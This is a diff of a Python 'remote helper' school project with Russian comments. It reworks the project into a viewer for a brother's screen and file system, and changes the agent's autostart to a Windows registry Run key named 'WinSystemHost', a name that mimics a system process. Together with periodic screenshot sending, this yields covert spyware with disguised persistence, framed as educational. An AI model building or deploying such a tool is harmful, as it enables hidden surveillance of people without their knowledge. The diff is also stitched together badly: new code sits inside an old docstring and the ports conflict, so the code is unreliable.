@@ -1,11 +1,11 @@
 """
 =============================================================================
-КЛИЕНТСКАЯ ЧАСТЬ (Client)
+КЛИЕНТСКАЯ ЧАСТЬ (Client) - у меня
 =============================================================================
 Образовательный проект: "Инструмент для удалённой помощи члену семьи"
 
-Назначение: Программа устанавливается на ПК, которому нужна помощь.
-            Она позволяет удалённо видеть экран и файловую систему.
+Назначение: Программа устанавливается на мой ПК.
+            Она подключается к серверу брата и получает скриншоты и файлы.
 
 Автор: [Имя ученика]
 Дата: 2026
@@ -13,20 +13,474 @@
 Предмет: Сетевые протоколы / Python
 
 =============================================================================
-ТЕОРЕТИЧЕСКАЯ ЧАСТЬ (для понимания принципа работы):
+ФУНКЦИИ:
+- GUI на Tkinter для ввода IP-адреса сервера
+- Подключение к серверу брата
+- Отображение скриншотов в реальном времени
+- Файловый браузер для просмотра папок брата
 =============================================================================
+"""
 
-1. TCP/IP - это основной протокол интернета.
-   - TCP (Transmission Control Protocol) - обеспечивает надёжную доставку данных
-   - IP (Internet Protocol) - адресация устройств в сети
+import socket       # Библиотека для работы с сетью (TCP/IP)
+import tkinter      # Библиотека для графического интерфейса
+from tkinter import ttk, messagebox
+import threading    # Библиотека для многозадачности
+import base64       # Библиотека для декодирования данных (изображения)
+import io           # Библиотека для работы с потоками данных
+import os           # Библиотека для работы с файловой системой
+from PIL import Image, ImageTk  # Библиотека для работы с изображениями
 
-2. Сокет (Socket) - это программный интерфейс для сетевой коммуникации.
-   - Сервер создаёт сокет и слушает порт
-   - Клиент подключается к серверу по IP-адресу и порту
 
-3. Скриншот - это изображение экрана, которое можно получить программно.
+# =============================================================================
+# КОНФИГУРАЦИЯ КЛИЕНТА
+# =============================================================================
 
-4. Auto-Start через папку Автозагрузки - программа запускается при старте Windows.
+# Порт сервера (должен совпадать с портом сервера)
+SERVER_PORT = 5555
+
+
+# =============================================================================
+# КЛАСС ГЛАВНОГО ОКНА ПРИЛОЖЕНИЯ
+# =============================================================================
+
+class RemoteHelperClient:
+    """
+    Класс главного окна клиента.
+    
+    Содержит:
+    - Окно подключения (ввод IP)
+    - Окно просмотра экрана (Remote View)
+    - Панель файлового браузера (File Explorer)
+    """
+    
+    def __init__(self, root):
+        """
+        Конструктор класса - инициализирует окно и его компоненты.
+        """
+        self.root = root
+        self.root.title("Удалённая помощь - Клиент")
+        self.root.geometry("1000x700")
+        
+        # Переменные для хранения состояния
+        self.server_socket = None  # Сокет для связи с сервером
+        self.current_path = "C:\\"  # Текущая папка в файловом браузере
+        self.running = True  # Флаг работы программы
+        self.connected = False  # Флаг подключения
+        
+        # Создаём интерфейс
+        self.create_connection_screen()
+    
+    
+    def create_connection_screen(self):
+        """
+        Создаёт экран подключения (ввод IP-адреса сервера).
+        """
+        # Очищаем окно
+        for widget in self.root.winfo_children():
+            widget.destroy()
+        
+        # Рамка для подключения
+        connection_frame = ttk.Frame(self.root, padding=50)
+        connection_frame.pack(fill='both', expand=True)
+        
+        # Заголовок
+        ttk.Label(
+            connection_frame, 
+            text="Подключение к серверу",
+            font=("Arial", 18, "bold")
+        ).pack(pady=20)
+        
+        # Поле для ввода IP-адреса
+        ttk.Label(connection_frame, text="IP-адрес сервера:").pack(pady=5)
+        self.ip_entry = ttk.Entry(connection_frame, font=("Arial", 14), width=20)
+        self.ip_entry.insert(0, "192.168.31.11")  # IP по умолчанию
+        self.ip_entry.pack(pady=10)
+        
+        # Кнопка подключения
+        connect_button = ttk.Button(
+            connection_frame, 
+            text="Подключиться", 
+            command=self.connect_to_server
+        )
+        connect_button.pack(pady=20)
+        
+        # Статус подключения
+        self.status_label = ttk.Label(
+            connection_frame, 
+            text="Введите IP-адрес сервера и нажмите 'Подключиться'",
+            font=("Arial", 10),
+            foreground="gray"
+        )
+        self.status_label.pack(pady=10)
+    
+    
+    def create_main_interface(self):
+        """
+        Создаёт основной интерфейс после подключения.
+        """
+        # Очищаем окно
+        for widget in self.root.winfo_children():
+            widget.destroy()
+        
+        # Создаём меню (вкладки)
+        self.notebook = ttk.Notebook(self.root)
+        self.notebook.pack(fill='both', expand=True, padx=5, pady=5)
+        
+        # Вкладка 1: Remote View (просмотр экрана)
+        self.view_frame = ttk.Frame(self.notebook)
+        self.notebook.add(self.view_frame, text="📺 Remote View")
+        self.create_remote_view_tab()
+        
+        # Вкладка 2: File Explorer (файловый браузер)
+        self.explorer_frame = ttk.Frame(self.notebook)
+        self.notebook.add(self.explorer_frame, text="📁 File Explorer")
+        self.create_file_explorer_tab()
+    
+    
+    def create_remote_view_tab(self):
+        """
+        Создаёт вкладку Remote View (просмотр экрана).
+        """
+        # Метка статуса
+        self.view_status_label = ttk.Label(
+            self.view_frame, 
+            text="Подключено. Ожидание скриншотов...",
+            font=("Arial", 12)
+        )
+        self.view_status_label.pack(pady=10)
+        
+        # Рамка для изображения
+        self.image_frame = ttk.Frame(self.view_frame, borderwidth=2, relief="solid")
+        self.image_frame.pack(fill='both', expand=True, padx=10, pady=10)
+        
+        # Метка для отображения изображения
+        self.image_label = ttk.Label(
+            self.image_frame,
+            text="Здесь будет отображаться экран сервера",
+            font=("Arial", 14),
+            foreground="gray"
+        )
+        self.image_label.pack(fill='both', expand=True)
+        
+        # Переменная для хранения изображения
+        self.photo_image = None
+    
+    
+    def create_file_explorer_tab(self):
+        """
+        Создаёт вкладку File Explorer (файловый браузер).
+        """
+        # Панель навигации
+        nav_frame = ttk.Frame(self.explorer_frame)
+        nav_frame.pack(fill='x', padx=10, pady=10)
+        
+        ttk.Label(nav_frame, text="Текущий путь:").pack(side='left', padx=5)
+        
+        self.path_label = ttk.Label(nav_frame, text=self.current_path, font=("Courier", 10))
+        self.path_label.pack(side='left', padx=5)
+        
+        self.up_button = ttk.Button(nav_frame, text="⬆ Вверх", command=self.go_up)
+        self.up_button.pack(side='left', padx=5)
+        
+        self.home_button = ttk.Button(nav_frame, text="🏠 Домой", command=self.go_home)
+        self.home_button.pack(side='left', padx=5)
+        
+        self.refresh_button = ttk.Button(nav_frame, text="🔄 Обновить", command=self.refresh_files)
+        self.refresh_button.pack(side='left', padx=5)
+        
+        # Список файлов
+        list_frame = ttk.Frame(self.explorer_frame)
+        list_frame.pack(fill='both', expand=True, padx=10, pady=10)
+        
+        scrollbar = ttk.Scrollbar(list_frame)
+        scrollbar.pack(side='right', fill='y')
+        
+        self.file_list = tkinter.Listbox(
+            list_frame, 
+            yscrollcommand=scrollbar.set,
+            font=("Courier", 10),
+            selectmode='single'
+        )
+        self.file_list.pack(side='left', fill='both', expand=True)
+        scrollbar.config(command=self.file_list.yview)
+        
+        self.file_list.bind('<Double-Button-1>', self.on_file_double_click)
+        
+        open_button = ttk.Button(self.explorer_frame, text="Открыть", command=self.open_selected)
+        open_button.pack(pady=5)
+    
+    
+    # ============================================================================
+    # ФУНКЦИИ ПОДКЛЮЧЕНИЯ
+    # ============================================================================
+    
+    def connect_to_server(self):
+        """
+        Подключается к серверу по введённому IP-адресу.
+        """
+        server_ip = self.ip_entry.get().strip()
+        
+        if not server_ip:
+            messagebox.showerror("Ошибка", "Введите IP-адрес сервера")
+            return
+        
+        self.status_label.config(text="Подключение...", foreground="orange")
+        self.root.update()
+        
+        try:
+            # Создаём сокет
+            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            # Подключаемся к серверу
+            self.server_socket.connect((server_ip, SERVER_PORT))
+            
+            # Ждём подтверждение от сервера
+            response = self.server_socket.recv(1024).decode('utf-8')
+            
+            if response == "CONNECTED":
+                self.connected = True
+                self.status_label.config(text="Подключено!", foreground="green")
+                messagebox.showinfo("Успех", "Подключение установлено!")
+                
+                # Создаём основной интерфейс
+                self.create_main_interface()
+                
+                # Запускаем потоки
+                self.start_receiving()
+                
+            elif response.startswith("BLOCKED"):
+                messagebox.showerror("Ошибка", "Доступ заблокирован. Ваш IP не в белом списке.")
+                self.server_socket.close()
+                self.status_label.config(text="Отклонено сервером", foreground="red")
+            else:
+                messagebox.showerror("Ошибка", f"Неизредный ответ: {response}")
+                self.server_socket.close()
+                
+        except ConnectionRefusedError:
+            messagebox.showerror("Ошибка", "Сервер недоступен. Проверьте IP и порт.")
+            self.status_label.config(text="Ошибка подключения", foreground="red")
+        except Exception as e:
+            messagebox.showerror("Ошибка", f"Ошибка подключения: {e}")
+            self.status_label.config(text="Ошибка", foreground="red")
+    
+    
+    def start_receiving(self):
+        """
+        Запускает потоки приёма данных.
+        """
+        # Поток приёма скриншотов
+        self.screenshot_thread = threading.Thread(target=self.receive_screenshots, daemon=True)
+        self.screenshot_thread.start()
+        
+        # Поток обработки команд
+        self.command_thread = threading.Thread(target=self.handle_server_commands, daemon=True)
+        self.command_thread.start()
+    
+    
+    def receive_screenshots(self):
+        """
+        Принимает скриншоты от сервера и отображает их.
+        """
+        while self.running and self.connected and self.server_socket:
+            try:
+                # Получаем размер данных
+                size_data = self.server_socket.recv(4)
+                
+                if not size_data:
+                    break
+                
+                size = int.from_bytes(size_data, byteorder='big')
+                
+                # Получаем данные изображения
+                data = b''
+                while len(data) < size:
+                    chunk = self.server_socket.recv(4096)
+                    if not chunk:
+                        break
+                    data += chunk
+                
+                # Декодируем и отображаем
+                image_data = base64.b64decode(data)
+                buffer = io.BytesIO(image_data)
+                img = Image.open(buffer)
+                
+                # Масштабируем если нужно
+                try:
+                    width = self.image_frame.winfo_width()
+                    height = self.image_frame.winfo_height()
+                    if width > 1 and height > 1:
+                        img_width, img_height = img.size
+                        ratio = min(width / img_width, height / img_height)
+                        new_size = (int(img_width * ratio), int(img_height * ratio))
+                        img = img.resize(new_size, Image.Resampling.LANCZOS)
+                except:
+                    pass
+                
+                self.photo_image = ImageTk.PhotoImage(img)
+                self.root.after(0, self.update_image_display)
+                
+            except Exception as e:
+                print(f"[Скриншот] Ошибка: {e}")
+                break
+        
+        print("[Клиент] Поток скриншотов завершён")
+    
+    
+    def update_image_display(self):
+        """
+        Обновляет отображаемое изображение.
+        """
+        if self.photo_image:
+            self.image_label.config(image=self.photo_image, text="")
+    
+    
+    def handle_server_commands(self):
+        """
+        Обрабатывает команды файлового браузера.
+        """
+        while self.running and self.connected and self.server_socket:
+            # Команды обрабатываются синхронно по запросу пользователя
+            pass
+    
+    
+    # ============================================================================
+    # ФУНКЦИИ ФАЙЛОВОГО БРАУЗЕРА
+    # ============================================================================
+    
+    def send_list_command(self, path):
+        """
+        Отправляет команду LIST серверу.
+        """
+        if not self.server_socket:
+            messagebox.showwarning("Предупреждение", "Нет подключения")
+            return
+        
+        try:
+            command = f"LIST:{path}"
+            self.server_socket.sendall(command.encode('utf-8'))
+            
+            self.server_socket.settimeout(10)
+            response = self.server_socket.recv(65536).decode('utf-8')
+            
+            if response.startswith("ERROR:"):
+                messagebox.showerror("Ошибка", response[6:])
+                return
+            
+            self.file_list.delete(0, tkinter.END)
+            
+            lines = response.split('\n')
+            for line in lines:
+                if line:
+                    parts = line.split('|')
+                    name = parts[0]
+                    file_type = parts[1] if len(parts) > 1 else "FILE"
+                    
+                    if file_type == "DIR":
+                        self.file_list.insert(tkinter.END, f"📁 {name}")
+                    else:
+                        self.file_list.insert(tkinter.END, f"📄 {name}")
+            
+            self.current_path = path
+            self.path_label.config(text=path)
+            
+        except socket.timeout:
+            messagebox.showwarning("Таймаут", "Сервер не отвечает")
+        except Exception as e:
+            messagebox.showerror("Ошибка", str(e))
+    
+    
+    def go_up(self):
+        """
+        Переходит в родительскую папку.
+        """
+        parent = os.path.dirname(self.current_path)
+        if parent:
+            self.send_list_command(parent)
+    
+    
+    def go_home(self):
+        """
+        Переходит в корневую папку.
+        """
+        self.send_list_command("C:\\")
+    
+    
+    def refresh_files(self):
+        """
+        Обновляет список файлов.
+        """
+        self.send_list_command(self.current_path)
+    
+    
+    def on_file_double_click(self, event):
+        """
+        Обрабатывает двойной клик по файлу/папке.
+        """
+        selection = self.file_list.curselection()
+        if selection:
+            item = self.file_list.get(selection[0])
+            name = item[2:] if item.startswith("📁 ") or item.startswith("📄 ") else item
+            
+            new_path = os.path.join(self.current_path, name)
+            
+            if item.startswith("📁 "):
+                self.send_list_command(new_path)
+            else:
+                self.show_file_info(new_path)
+    
+    
+    def open_selected(self):
+        """
+        Открывает выбранный файл/папку.
+        """
+        selection = self.file_list.curselection()
+        if selection:
+            self.on_file_double_click(None)
+    
+    
+    def show_file_info(self, path):
+        """
+        Показывает информацию о файле.
+        """
+        if not self.server_socket:
+            return
+        
+        try:
+            command = f"INFO:{path}"
+            self.server_socket.sendall(command.encode('utf-8'))
+            
+            self.server_socket.settimeout(5)
+            response = self.server_socket.recv(4096).decode('utf-8')
+            
+            messagebox.showinfo("Информация о файле", response)
+            
+        except Exception as e:
+            messagebox.showerror("Ошибка", str(e))
+
+
+# =============================================================================
+# ТОЧКА ВХОДА
+# =============================================================================
+
+def main():
+    """
+    Главная функция - создаёт и запускает приложение.
+    """
+    root = tkinter.Tk()
+    app = RemoteHelperClient(root)
+    
+    def on_closing():
+        app.running = False
+        if app.server_socket:
+            app.server_socket.close()
+        root.destroy()
+    
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+    root.mainloop()
+
+
+if __name__ == "__main__":
+    main()
 
 =============================================================================
 """
@@ -40,6 +494,7 @@ import threading    # Библиотека для многозадачности
 import shutil       # Библиотека для работы с файлами
 import base64       # Библиотека для кодирования данных (изображения)
 import io           # Библиотека для работы с потоками данных
+import winreg       # Библиотека для работы с реестром Windows
 from PIL import Image  # Библиотека для работы с изображениями (Pillow)
 
 
@@ -56,9 +511,6 @@ SERVER_PORT = 9999
 
 # Интервал отправки скриншотов в секундах
 SCREENSHOT_INTERVAL = 5
-
-# Имя файла для автозапуска
-AUTOSTART_FILENAME = "remote_helper_client.pyw"
 
 
 # =============================================================================
@@ -239,60 +691,77 @@ def handle_server_commands(sock):
 
 
 # =============================================================================
-# ФУНКЦИЯ 3: АВТОЗАПУСК (Auto-Start)
+# ФУНКЦИЯ 3: АВТОЗАПУСК ЧЕРЕЗ РЕЕСТР (Auto-Start)
 # =============================================================================
 """
-Принцип работы Auto-Start:
-1. При первом запуске программа копирует себя в папку Автозагрузки Windows
-2. Папка Автозагрузки: C:\Users\<Имя пользователя>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-3. Теперь при каждом включении компьютера программа запускается автоматически
+Принцип работы Auto-Start через реестр:
+1. При запуске программа проверяет ключ реестра HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+2. Если ключа нет - добавляет путь к программе в этот ключ
+3. При каждом старте Windows программа запускается автоматически
 
-Это полезно, чтобы не забыть запустить программу после перезагрузки.
+Реестр Windows - это база данных настроек системы.
+HKCU - это ветка реестра текущего пользователя (HKEY_CURRENT_USER)
 """
 
-def setup_autostart():
+def add_to_startup():
     """
-    Функция настраивает автозапуск программы при старте Windows.
+    Функция добавляет программу в автозапуск через реестр Windows.
     
-    Как это работает:
-    1. Определяем путь к папке Автозагрузки текущего пользователя
-    2. Проверяем, не установлен ли уже автозапуск
-    3. Если нет - копируем файл программы в папку Автозагрузки
+    Использует библиотеку winreg для работы с системным реестром.
+    Определяет, запущен ли скрипт как .py или как .exe.
     
-    Папка Автозагрузки в Windows:
-    %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
-    
-    %APPDATA% обычно равен:
-    C:\Users\<Имя пользователя>\AppData\Roaming
+    Ключ реестра: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
     """
     try:
-        # Шаг 1: Получаем путь к папке Автозагрузки
-        # os.path.expandvars('%APPDATA%') заменяет %APPDATA% на реальный путь
-        startup_folder = os.path.join(
-            os.path.expandvars('%APPDATA%'),
-            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+        # Имя ключа в реестре (произвольное название)
+        REG_KEY_NAME = "WinSystemHost"
+        
+        # Определяем путь к запущенному файлу
+        if getattr(sys, 'frozen', False):
+            # Скрипт запущен как скомпилированный .exe
+            # sys.executable содержит путь к exe-файлу
+            exe_path = sys.executable
+            print(f"[Auto-Start] Определён как .exe: {exe_path}")
+        else:
+            # Скрипт запущен как .py файл
+            # sys.argv[0] содержит путь к скрипту
+            exe_path = sys.executable + " " + sys.argv[0]
+            print(f"[Auto-Start] Определён как .py: {exe_path}")
+        
+        # Открываем ключ реестра для чтения
+        # winreg.OpenKey(ключ, подключь, права_доступа)
+        # HKEY_CURRENT_USER - ветка реестра текущего пользователя
+        # 0 - открыть подключ (не создавать)
+        # KEY_WRITE | KEY_READ - права на запись и чтение
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_READ | winreg.KEY_WRITE
         )
         
-        # Шаг 2: Получаем путь к текущему файлу программы
-        # sys.executable - путь к интерпретатору Python
-        # sys.argv[0] - путь к запущенному скрипту
-        current_file = sys.argv[0]
-        
-        # Шаг 3: Формируем путь для автозапуска
-        autostart_path = os.path.join(startup_folder, AUTOSTART_FILENAME)
-        
-        # Шаг 4: Проверяем, не установлен ли уже автозапуск
-        if not os.path.exists(autostart_path):
-            # Шаг 5: Копируем файл в папку Автозагрузки
-            # Используем shutil.copy2 для сохранения метаданных
-            shutil.copy2(current_file, autostart_path)
-            print(f"[Auto-Start] Программа добавлена в автозапуск: {autostart_path}")
-        else:
-            print("[Auto-Start] Автозапуск уже настроен")
+        try:
+            # Пробуем получить значение ключа
+            # Если ключ существует - получим путь, если нет - исключение
+            existing_value = winreg.QueryValueEx(key, REG_KEY_NAME)
+            print(f"[Auto-Start] Уже в автозапуске: {existing_value[0]}")
             
+        except FileNotFoundError:
+            # Ключ не существует - добавляем новый
+            # winreg.SetValueEx(ключ, имя_значения, тип, данные)
+            # REG_SZ = строка (текстовый тип)
+            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, exe_path)
+            print(f"[Auto-Start] Добавлено в автозапуск: {exe_path}")
+            
+        finally:
+            # Закрываем ключ реестра (важно!)
+            winreg.CloseKey(key)
+            
+    except PermissionError:
+        print("[Auto-Start] Ошибка: нет прав для записи в реестр")
+        print("           Запустите программу от имени администратора")
     except Exception as e:
-        # Если не удалось настроить автозапуск - не критично
-        print(f"[Auto-Start] Не удалось настроить автозапуск: {e}")
+        print(f"[Auto-Start] Ошибка: {e}")
 
 
 # =============================================================================
@@ -320,8 +789,8 @@ def connect_to_server():
     print("  Подключение к серверу...")
     print("=" * 60)
     
-    # Настраиваем автозапуск
-    setup_autostart()
+    # Настраиваем автозапуск через реестр
+    add_to_startup()
     
     while True:
         try:
